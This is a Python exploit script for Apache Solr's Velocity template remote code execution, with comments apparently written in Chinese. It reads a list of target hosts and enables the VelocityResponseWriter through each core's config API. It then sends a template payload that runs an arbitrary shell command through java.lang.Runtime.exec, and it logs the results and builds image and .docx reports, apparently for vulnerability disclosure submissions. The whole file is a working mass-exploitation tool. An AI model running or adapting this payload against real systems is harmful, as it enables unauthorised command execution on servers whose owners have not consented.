import requests
import json
import sys
from docx import Document
from docx.shared import Inches

from requests.packages import urllib3
urllib3.disable_warnings()

from ImageMake import Images
import time

from DocxMake import DocxMake

def getname(url):
    try:
        url += "/solr/admin/cores?wt=json&indexInfo=false"
        conn = requests.get(url=url, verify=False, timeout=5)
        name = ""
    except Exception as e:
        print(e)
        return None

    try:
        name = list(json.loads(conn.text)["status"])[0]
        print("Solr  Core   :  ", name)
    except:
        pass
    return name


def upconfig(url, name):

    url_config =url + "/solr/"+name+"/config"
    print("Upconfig     :  ", url_config)
    headers = {"Content-Type": "application/json"}
    post_data = """
    {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }
    """
    try:
        conn = requests.post(url_config, data=post_data, headers=headers, verify=False, timeout=5)
    except Exception as e:
        print(e)
        return None
    if conn.status_code != 200:
        print("Upconfig error: ", conn.status_code)
        return 0
    else:
        return url_config
    
def images(url, core_name, cmd, cmd_text):
    ss, ip, port = url.split(":")
    Upconfig = url + "/solr/" + core_name + "/config"
    name = ip[2:]+"-solr_RCE-"+time.strftime("%Y-%m-%d", time.localtime())
    image_name = name + ".jpg"

    string = f"""
    D:\CNVD>python3 solr_exp.py  {url} whoami

    待测试主机    ：  {ip}
    待执行命令    ：  {cmd}
    Solr  Core    :   {core_name}
    Upconfig      :   {Upconfig}
    ExecCmd {cmd}:    {cmd_text}

    """
    strings = string
    print(image_name)
    Images.create_pic()
    Images.write_pic(strings, image_name)
    return name


def write_docx(core_name, imagename, docxname):

    DocxMake.docxmake(core_name, imagename, docxname)

def poc(domain,cmd):
    core_name = getname(domain)
    if not core_name:
        print("是否受影响   ： Not Vulu !")
        return 0
    url_config = upconfig(domain, core_name)
    if not url_config:
        return 0
    url = domain + "/solr/"+core_name+"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27"+cmd+"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
    try:
        conn = requests.get(url, verify=False, timeout=5)
    except Exception as e:
        print(e)
        return None
    text = conn.content.decode('utf-8')
    if len(text) < 100 and '{' not in text and len(text) > 1:
        print("ExecCmd %s:  " % cmd, text)
        fw.write('"'+domain+"/solr/"+core_name+"/config\", " + text + "\n")
        
        image_name = images(domain, core_name, cmd, text)
        write_docx(url_config, image_name+ ".jpg", image_name+".docx")


# 结果写入文件 output.txt
fw = open('output.csv', 'a')

# 待扫描url放入solr.txt文件，一行一个
# 格式： http://127.0.0.1:8983  or 127.0.0.1:8983
fb = open('solr.txt', 'r')
urls = fb.readlines()

for i in urls:
    url = i.strip()

    if 'http' not in url:
        url = "http://"+ url
    cmd = "whoami"
    print("待测试主机   ： " , url)
    print("待执行命令   ： ", cmd)
    poc(url,cmd)
    print("\r\n")

fw.close()




